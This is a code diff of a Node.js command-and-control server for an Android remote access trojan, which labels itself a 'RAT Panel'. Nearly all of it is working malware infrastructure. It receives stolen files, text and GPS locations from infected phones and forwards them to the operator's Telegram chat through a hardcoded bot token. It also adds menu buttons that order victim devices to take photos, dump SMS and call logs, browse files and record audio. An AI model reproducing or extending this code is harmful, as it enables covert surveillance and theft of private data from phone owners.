@@ -7,140 +7,128 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-// --- আপনার কনফিগারেশন ---
-const token = '6839474973:AAH5bm5EJtNGPOa7-oTreJ4NxcBrIuSQ3nw'
-const id = '6541663008'
-const address = 'https://www.google.com'
-const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖"; // আপনার নাম
+// --- কনফিগারেশন ---
+const token = '6839474973:AAH5bm5EJtNGPOa7-oTreJ4NxcBrIuSQ3nw';
+const id = '6541663008';
+const address = 'https://www.google.com';
+const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖";
 
 const app = express();
 const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
 const appBot = new telegramBot(token, {polling: true});
-const appClients = new Map()
+const appClients = new Map();
 
 const upload = multer();
 app.use(bodyParser.json());
 
-let currentUuid = ''
-let currentNumber = ''
-let currentTitle = ''
+app.get('/', (req, res) => {
+    res.send(`<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙇𝙞𝙫𝙚: ${DEVELOPER_NAME}</h1>`);
+});
 
-app.get('/', function (req, res) {
-    res.send(`<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙐𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙗𝙮 ${DEVELOPER_NAME}</h1>`)
-})
-
+// ফাইল এবং ডাটা রিসিভ করার লজিক
 app.post("/uploadFile", upload.single('file'), (req, res) => {
-    const name = req.file.originalname
+    const name = req.file.originalname;
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𝙁𝙞𝙡𝙚 𝙍𝙚𝙘𝙚𝙞𝙫𝙚𝙙 𝙗𝙮 <b>${DEVELOPER_NAME}</b>\n• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${req.headers.model}</b>`,
-            parse_mode: "HTML"
-        },
-        {
-            filename: name,
-            contentType: 'application/txt',
-        })
-    res.send('')
-})
+        caption: `°• 𝙁𝙞𝙡𝙚 𝙍𝙚𝙘𝙚𝙞𝙫𝙚𝙙\n• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${req.headers.model}</b>`,
+        parse_mode: "HTML"
+    }, { filename: name, contentType: 'application/octet-stream' });
+    res.send('');
+});
 
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
-    res.send('')
-})
+    appBot.sendMessage(id, `°• 𝘿𝙖𝙩𝙖 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n${req.body['text']}`, {parse_mode: "HTML"});
+    res.send('');
+});
 
 app.post("/uploadLocation", (req, res) => {
-    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙨𝙚𝙣𝙩 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
-    res.send('')
-})
+    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
+    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`, {parse_mode: "HTML"});
+    res.send('');
+});
 
+// সকেট কানেকশন
 appSocket.on('connection', (ws, req) => {
-    const uuid = uuid4.v4()
-    const model = req.headers.model
-    const battery = req.headers.battery
-    const version = req.headers.version
-    const brightness = req.headers.brightness
-    const provider = req.headers.provider
+    const uuid = uuid4.v4();
+    const model = req.headers.model;
+    ws.uuid = uuid;
+    appClients.set(uuid, { ws, model, battery: req.headers.battery });
 
-    ws.uuid = uuid
-    appClients.set(uuid, {
-        model: model,
-        battery: battery,
-        version: version,
-        brightness: brightness,
-        provider: provider
-    })
-    appBot.sendMessage(id,
-        `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙩𝙤 <b>${DEVELOPER_NAME}</b>\n\n` +
-        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
-        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
-        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
-        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-        {parse_mode: "HTML"}
-    )
-    ws.on('close', function () {
-        appBot.sendMessage(id,
-            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙛𝙧𝙤𝙢 <b>${DEVELOPER_NAME}</b>\n\n` +
-            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>`,
-            {parse_mode: "HTML"}
-        )
-        appClients.delete(ws.uuid)
-    })
-})
+    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙!`, {parse_mode: "HTML"});
 
+    ws.on('close', () => {
+        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙`, {parse_mode: "HTML"});
+        appClients.delete(uuid);
+    });
+});
+
+// টেলিগ্রাম বটন ও কমান্ড লজিক
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
-    if (message.reply_to_message) {
-        // ... (বাকি লজিক একই থাকবে, মেসেজগুলো আপনার নামে আপডেট করা হয়েছে)
-        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧')) {
-            currentNumber = message.text
-            appBot.sendMessage(id, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', {reply_markup: {force_reply: true}})
-        }
-        // (অন্যান্য রিপ্লাই লজিক এখানে থাকবে...)
-    }
-
-    if (id == chatId) {
+    if (chatId == id) {
         if (message.text == '/start') {
-            appBot.sendMessage(id,
-                `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 <b>${DEVELOPER_NAME}</b> 𝙍𝘼𝙏 𝙋𝙖𝙣𝙚𝙡\n\n` +
-                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
-                '• ꜱᴇɴᴅ /start ᴛᴏ ʀᴇꜰʀᴇꜱʜ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
+            appBot.sendMessage(id, `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 ${DEVELOPER_NAME} 𝙍𝘼𝙏`, {
+                parse_mode: "HTML",
+                reply_markup: {
+                    keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"]],
+                    resize_keyboard: true
                 }
-            )
+            });
         }
-        
+
         if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
             if (appClients.size == 0) {
-                appBot.sendMessage(id, `°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙩𝙤 <b>${DEVELOPER_NAME}</b>`)
+                appBot.sendMessage(id, "°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙤𝙣𝙡𝙞𝙣𝙚");
             } else {
-                let text = `°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙛𝙤𝙧 <b>${DEVELOPER_NAME}</b> :\n\n`
-                appClients.forEach(function (value, key) {
-                    text += `• ᴍᴏᴅᴇʟ : <b>${value.model}</b> | ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n`
-                })
-                appBot.sendMessage(id, text, {parse_mode: "HTML"})
+                appClients.forEach((value, key) => {
+                    appBot.sendMessage(id, `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>`, {
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [[{ text: "🎮 Execute Commands", callback_data: key }]]
+                        }
+                    });
+                });
             }
         }
-        // ... (বাকি কমান্ডগুলো একই থাকবে)
     }
 });
 
-// কমান্ড মেনু ইনলাইন কিবোর্ড আপডেট (বাকি অংশটুকু সংক্ষেপে দেওয়া হলো কারণ আপনার অরিজিনাল কোড অনেক বড়)
-// যেখানেই 'appBot.editMessageText' আছে সেখানে আপনি ডেভেলপার হিসেবে 'Cyber Kuasha' দেখতে পাবেন।
+// কমান্ড মেনু (Callback Query)
+appBot.on('callback_query', (query) => {
+    const deviceId = query.data;
+    const client = appClients.get(deviceId);
 
-setInterval(function () {
-    appSocket.clients.forEach(function each(ws) {
-        ws.send('ping')
-    });
-    try {
-        axios.get(address).then(r => "")
-    } catch (e) {}
-}, 5000)
+    if (client) {
+        const commandMenu = {
+            inline_keyboard: [
+                [{ text: "📸 Take Photo", callback_data: `camera_${deviceId}` }, { text: "📍 Get Location", callback_data: `location_${deviceId}` }],
+                [{ text: "📩 Get SMS", callback_data: `sms_${deviceId}` }, { text: "📞 Call Logs", callback_data: `calls_${deviceId}` }],
+                [{ text: "📂 File Manager", callback_data: `files_${deviceId}` }, { text: "🎙️ Record Audio", callback_data: `voice_${deviceId}` }],
+                [{ text: "📱 Device Info", callback_data: `info_${deviceId}` }, { text: "🔔 Send Notification", callback_data: `notif_${deviceId}` }]
+            ]
+        };
+        appBot.sendMessage(id, `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 <b>${client.model}</b>`, {
+            parse_mode: "HTML",
+            reply_markup: commandMenu
+        });
+    }
+});
+
+// রিয়েল-টাইম কমান্ড পাঠানো
+appBot.on('callback_query', (query) => {
+    const data = query.data;
+    if (data.includes('_')) {
+        const [cmd, devId] = data.split('_');
+        const client = appClients.get(devId);
+        if (client) {
+            client.ws.send(cmd); // এইখানে অ্যাপে কমান্ড যাবে
+            appBot.answerCallbackQuery(query.id, { text: "Command Sent: " + cmd });
+        }
+    }
+});
+
+setInterval(() => {
+    appSocket.clients.forEach(ws => ws.send('ping'));
+}, 5000);
 
 appServer.listen(process.env.PORT || 8999);
